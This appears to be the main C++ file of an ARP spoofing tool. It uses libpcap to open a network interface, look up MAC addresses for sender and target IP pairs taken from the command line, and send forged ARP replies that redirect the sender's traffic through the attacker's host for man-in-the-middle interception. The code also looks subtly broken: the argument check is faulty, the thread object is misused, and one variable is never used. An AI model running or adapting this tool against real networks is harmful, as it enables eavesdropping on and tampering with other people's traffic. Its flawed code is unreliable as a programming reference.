#include <iostream>
#include <pcap.h>
#include <thread>
#include <vector>
#include "arp_spoof.h"

using namespace std;

int main(int argc, char** argv)
{
    if ((argc < 4) && (argc % 2 != 0))  //validating arguments
    {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    static pcap_t* handle = pcap_open_live(dev, PCAP_BUF_SIZE, 1, 1000, errbuf);          //handle
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    static uint8_t host_mac[6];
    get_attacker_mac(dev, host_mac);
    static uint8_t host_ip[4];


    thread* sessions = new thread(argc);    //create thread

    for (int i = 2, idx = 0; i < argc; i += 2, idx++)
    {
        uint8_t sender_mac[6], target_mac[6];
        uint8_t sender_IP[4], target_IP[4];

        convert_argv_into_ip(sender_IP, argv[i]);
        convert_argv_into_ip(target_IP, argv[i+1]);
        get_node_MAC(handle, host_mac, sender_IP, sender_mac);
        get_node_MAC(handle, host_mac, target_IP, target_mac);

        arp_spoof(handle, sender_mac, sender_IP, host_mac, target_IP);


    }


    delete sessions;
    return 0;
}
